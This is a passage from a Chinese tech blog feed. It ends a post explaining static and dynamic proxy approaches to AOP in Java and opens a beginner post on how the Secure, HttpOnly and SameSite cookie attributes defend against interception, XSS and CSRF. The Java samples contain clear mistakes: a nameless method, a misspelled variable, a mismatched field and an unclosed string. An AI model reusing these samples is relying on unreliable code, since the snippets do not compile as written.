&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;com&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;proxy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;FetchData&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;IFetchData&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token annotation punctuation&quot;&gt;@Override&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;取得資料&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;com&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;proxy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;AuthorizeProxy&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;IFetchData&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;IFetchData&lt;/span&gt; target&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;AuthorizeProxy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;IFetchData&lt;/span&gt; target&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;target &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; target&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    &lt;span class=&quot;token annotation punctuation&quot;&gt;@Override&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;執行before Aspect&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        target&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;執行after Aspect&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相信大家應該不難看出來，用靜態代理實現 AOP 非常之麻煩，有任何可能會需要被代理的地方都必須宣告成介面，同時 Aspect Proxy 也必須針對所有可能需要被代理的介面都撰寫重複的切面邏輯。在實務上這麼做其實不太實際。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;動態代理 ( Dynamic Proxy )&lt;br&gt;
另一種 Run-Time AOP ，同時也是 包含 Spring AOP 等套件所使用的主流方式是動態代理。這種作法的基礎是來自於 Java 原生包含的 reflection API。 reflection API 是一套可以向 JVM 詢問、修改 class 和其方法與屬性的機制。&lt;br&gt;
至於為什麼用 reflection 我們就可以實現 AOP，先讓我們參考以下這個範例：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;com&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;example&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dynamicproxy&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;AuthorizeProxy&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; delegate&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;AuthorizeService&lt;/span&gt; authorizeService&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; target&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;target &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; target&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;        &lt;span class=&quot;token comment&quot;&gt;// 向 reflection.Proxy 註冊 target 的類別並提供 Handler（此例中為this)，並回傳 proxy 實例， &lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token comment&quot;&gt;// proxy 藉由 reflection API，可以構造出一個跟 target 具有一樣 method 和 field 的全新類別&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newProxyInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; &lt;br&gt;                           target&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;br&gt;                           target&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInterfaces&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;br&gt;                           &lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;br&gt;    &lt;span class=&quot;token annotation punctuation&quot;&gt;@Override&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; proxy&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;br&gt;                         &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;UnAuthorizedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;br&gt;        &lt;span class=&quot;token comment&quot;&gt;// Aspect 真正的邏輯就在這邊執行&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;authorizeService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;Authorize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;tagret&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&quot;如果要做什麼 clean up 可以在這邊做&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;br&gt; &lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我們可以藉由一個 bind 函式，向 reflection.Proxy 註冊 target 的類別並提供 Handler（此例中為this)，並回傳 proxy 實例。&lt;/p&gt;
&lt;p&gt;Proxy 藉由 reflection API，可以建構出一個跟 target 具有一樣 method 和 field 的全新類別，但因為我們實現了 InovocationHandler 介面，因此 proxy 在建構這個幾乎一樣的類別時，會在 target 的方法被呼叫時改成呼叫 invoke 方法[5]，因此如果要實現 AOP ，我們就只要修改 invoke 函式加上需要的 aspects 就行了。&lt;/p&gt;
&lt;p&gt;需要注意的是，我們使用了基於 reflection API 動態創造出來的 class ，除了 會有 JVM 中 class loader 的 overhead 以外，這個 class 的 method 被呼叫時都會需要通過許多額外的檢查，讓許多 JVM 的執行期優化策略失效[6]，所以本質上這種作法在速度上會有明顯的劣勢。&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;com&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;example&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dynamicproxy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;DataFetcherDemo&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;DemoFetchData&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;AuthorizeProxy&lt;/span&gt; proxy  &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;AuthorizeProxy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;        &lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;IFetchData&lt;/span&gt; fetchData &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;IFetchData&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; proxy&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;FetchData&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; fetchData&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這種「動態代理」的方式正是 Spring 框架中的 Spring AOP 所使用的策略。根據 Spring AOP 的&lt;a href=&quot;https://docs.spring.io/spring-framework/docs/2.5.x/reference/aop.html&quot;&gt;官方 document&lt;/a&gt; ，在使用方面幾乎是跟 AspectJ 大同小異，卻可以省去建置專案時需要額外的插件來織入 aspects 的麻煩。&lt;/p&gt;
&lt;p&gt;但因為 Proxy 的管理是由 Spring 容器來執行，所以限制自然就是只有被 Spring 管理的 beans 可以被代理。&lt;/p&gt;
&lt;p&gt;基於動態代理來做 AOP 的話，務必要搞清楚 Proxy 的行為。在同一個類別中呼叫類別內其他函式的話，是沒有辦法被 Proxy 攔截的。考慮一個我們將 FooBoo 類別用 FooBooProxy 進行代理並呼叫其中的 boo 函式的狀況：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/TheSpiritAndImplementationOfAOP/1__LCqsIhQ__1KGPazjA85zDZQ.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;另外值得一提的一點是， Java 中實現動態代理除了使用原生的 Proxy 以外，亦可以使用如 &lt;a href=&quot;https://github.com/cglib/cglib&quot;&gt;cglib&lt;/a&gt; 等 bytecode generation 函式庫，可以做到讓 Proxy 繼承 target 類別就能完成動態代理，而不需要讓所有需要 AOP 的類別都實作特定介面 [7] 。&lt;/p&gt;
&lt;h4 id=&quot;%E7%B5%90%E8%AA%9E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AA%9E&quot;&gt;#&lt;/a&gt; 結語&lt;/h4&gt;
&lt;p&gt;AOP 切分關注點的核心思想在不同生態系中都有不同的實現方式。&lt;/p&gt;
&lt;p&gt;如果是在 Java 這種有眾多 AOP 不同實現的工具存在的語言，也要注意就算使用方式看起來幾乎一模一樣（看看 AspectJ 和 Spring AOP 的語法那驚人的相似度），背後執行的原理導致的適用情境、執行效率等等的差別所帶來的影響。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/TheSpiritAndImplementationOfAOP/1__FzyYBeQHVhaDG7Ln9Fif__A.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;— — -&lt;/p&gt;
&lt;p&gt;最後稍微介紹一下敝團隊。我們是隸屬於 OneDegree 集團底下的 Cymetrics 部門，此部門主要負責集團中資安產品的開發，團隊文化鼓勵工程師鑽研和分享技術原理。&lt;/p&gt;
&lt;p&gt;目前團隊有經營一個技術 Blog &lt;a href=&quot;https://medium.com/cymetrics&quot;&gt;https://medium.com/cymetrics&lt;/a&gt; &lt;br&gt;
用來分享團隊成員們在工作中遇到或者自己想鑽研的主題。&lt;/p&gt;
&lt;h4 id=&quot;references%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#references%3A&quot;&gt;#&lt;/a&gt; References:&lt;/h4&gt;
&lt;p&gt;[1]&lt;a href=&quot;https://www.slideshare.net/koneru9999/aspect-oriented-programing-introduction&quot;&gt;https://www.slideshare.net/koneru9999/aspect-oriented-programing-introduction&lt;/a&gt;&lt;br&gt;
[2]&lt;a href=&quot;https://stackoverflow.com/questions/8328824/what-is-the-difference-between-python-decorators-and-the-decorator-pattern&quot;&gt;https://stackoverflow.com/questions/8328824/what-is-the-difference-between-python-decorators-and-the-decorator-pattern&lt;/a&gt;&lt;br&gt;
[3]&lt;a href=&quot;https://livebook.manning.com/book/aspectj-in-action-second-edition/chapter-8/26&quot;&gt;https://livebook.manning.com/book/aspectj-in-action-second-edition/chapter-8/26&lt;/a&gt;&lt;br&gt;
[4]&lt;a href=&quot;https://www.nurkiewicz.com/2009/10/yesterday-i-had-pleasure-to-participate.html&quot;&gt;https://www.nurkiewicz.com/2009/10/yesterday-i-had-pleasure-to-participate.html&lt;/a&gt;&lt;br&gt;
[5]&lt;a href=&quot;https://www.itread01.com/content/1547764384.html&quot;&gt;https://www.itread01.com/content/1547764384.html&lt;/a&gt;&lt;br&gt;
[6]&lt;a href=&quot;https://mattwarren.org/2016/12/14/Why-is-Reflection-slow/&quot;&gt;https://mattwarren.org/2016/12/14/Why-is-Reflection-slow/&lt;/a&gt;&lt;br&gt;
[7]&lt;a href=&quot;https://www.cnblogs.com/carpenterlee/p/8241042.html&quot;&gt;https://www.cnblogs.com/carpenterlee/p/8241042.html&lt;/a&gt;&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>零基礎資安系列（三）-網站安全三本柱（Secure &amp; SameSite &amp; HttpOnly）</title>
		<link href="https://tech-blog.cymetrics.io/posts/jo/zerobased-secure-samesite-httponly/"/>
		<updated>2021-05-28T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/jo/zerobased-secure-samesite-httponly/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;保護 Cookie守衛網站安全的三本柱有不同的職責和能力&lt;/strong&gt;&lt;br&gt;
Secure 表示：我不會讓 Cookie去任何危險的地方！&lt;br&gt;
HttpOnly 表示：只要有我在的地方 &lt;em&gt;別想找到&lt;/em&gt; Cookie！&lt;br&gt;
SameSite 表示：所有和 Cookie 來源不同的請求都別想成功！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;%E9%87%8B%E4%BE%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%87%8B%E4%BE%8B&quot;&gt;#&lt;/a&gt; 釋例&lt;/h2&gt;
&lt;p&gt;今天要聊的這三種屬性，可以說是在網頁安全的防護上 CP 值最高的設定，想讓你了解瀏覽器為什麼需要這三種設定，而這三種屬性又為什麼會被稱為網站安全三本柱，他們擁有甚麼樣的功能和要如何進行設定，這些是我希望今天能帶給你的小知識，那麼話不多說，就讓我們繼續看下去。&lt;/p&gt;
&lt;h3 id=&quot;secure&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#secure&quot;&gt;#&lt;/a&gt; Secure&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Secure&lt;/strong&gt; 應該是屬於三本柱中最單純的一位，他的訴求很簡單，所有只要網站開頭不是 https 開頭的網站都沒有辦法獲得 Cookie 中的資訊，舉例來說：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-secure-samesite-httponly/p1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;網站的 Cookie 儲存了5個值，無論是網站本身的配置錯誤讓你可以選擇使用 https 或 http 瀏覽，還是攻擊者把你重導向到他在網站子域建立的未加密的惡意 http 網址裡，基本上在 http 中網站能獲得的，只會剩下第一個 Secure 沒有打勾的值，因為 Secure 會阻止所有他有打勾的值出現在 http 中，最直觀的感受就是，當你不小心連接到 http 的頁面中的時候他會把你登出，因為他找不到可以證明你身分的那些 Cookie 的值，這個時候千萬別傻傻的再登入一次，因為在 http 中傳送的資料可都是未加密的阿！&lt;/p&gt;
&lt;h3 id=&quot;httponly&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#httponly&quot;&gt;#&lt;/a&gt; HttpOnly&lt;/h3&gt;
&lt;p&gt;而 &lt;strong&gt;HttpOnly&lt;/strong&gt; 則可以說他是 XSS 之敵，如果有看過我的 &lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting&quot;&gt;基礎第二篇 XSS 攻擊介紹&lt;/a&gt; 的朋友，可以發現在 XSS 攻擊中，網站會允許攻擊者在網站中植入惡意的 JavaScript 藉此竊取使用者的 Cookie ，舉例來說：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-secure-samesite-httponly/p2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;網站的 Cookie 儲存了5個值，當攻擊者在有 XSS 攻擊漏洞中的網站植入惡意程式時，例如前端常用來查詢 Cookie 的 JavaScript 指令 document.cookie ，就是攻擊者最常使用的攻擊方式，攻擊者會在網站中執行 document.cookie 並將結果傳送給攻擊者，但如果我的網站中對敏感的 Cookie 值設定了 HttpOnly 會發生甚麼事？&lt;/p&gt;
&lt;p&gt;攻擊者會發現即使網站有 XSS 漏洞，也成功的植入了惡意程式，但卻沒有將你受到 HttpOnly 保護的 Cookie 值傳送回來，為什麼會這樣呢？&lt;/p&gt;
&lt;p&gt;原因是因為 HttpOnly 的功能就是拒絕與 JavaScript 共享 Cookie ，當 Cookie 中包含了設定 HttpOnly 的值之後，HttpOnly 會拒絕這個請求，藉此來保護 Cookie 不被不受信任的 JavaScript 存取，可以稱他為當之無愧的 XSS 之敵。&lt;/p&gt;
&lt;p&gt;不過額外一提，並不是只要設置了 HttpOnly 之後，即使網站有 XSS 漏洞也可以高枕無憂，曾經碰過一個實例是當某網站搜尋的產品 ID 錯誤時，網站會將當下頁面的所有資訊紀錄在頁面上（包含 Cookie）方便工程師除錯，於是攻擊者便在網站中嵌入一個當使用者進入頁面時預設搜尋一個錯誤的產品 ID 並將整個當下頁面傳送給攻擊者的惡意程式，除了 Cookie 以外還附贈了伺服器版本和套件版本，直接就是一個資訊洩漏大禮包。&lt;/p&gt;
&lt;h3 id=&quot;samesite&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#samesite&quot;&gt;#&lt;/a&gt; SameSite&lt;/h3&gt;
&lt;p&gt;講到這邊可能有人會問，如果有 &lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting&quot;&gt;XSS&lt;/a&gt; 之敵，那 CSRF 是不是也有？當然有！工程師也有同樣的疑問，於是 SameSite 這個 CSRF 之敵也出現了！&lt;/p&gt;
